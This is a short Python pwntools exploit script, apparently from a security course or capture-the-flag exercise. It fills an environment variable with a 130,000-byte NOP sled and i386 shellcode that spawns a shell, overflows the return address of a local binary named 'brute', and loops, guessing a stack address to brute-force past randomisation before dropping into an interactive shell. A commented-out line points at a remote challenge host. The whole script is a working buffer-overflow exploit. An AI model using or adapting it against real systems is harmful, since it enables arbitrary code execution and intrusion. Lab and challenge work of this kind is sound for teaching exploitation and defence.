from pwn import *

context.clear(arch='i386')

nop_sled = 130000

shell_str = flat({nop_sled:asm(shellcraft.i386.sh())}, filler='\x90')

while True:
    #p = remote('cs4401shell2.walls.ninja', 60964)
    #p.env={'NOP':shell_str}
    p = process('./brute', env={'NOP':shell_str})

    ret_offset = 16388
    #ret_mult = 4500
    guess_addr = 0xffbfffff

    guess_str = flat({ret_offset:pack(guess_addr)})
    #guess_str = pack(guess_addr) * ret_mult

    p.sendline(guess_str)
    p.interactive()
    #p.corefile
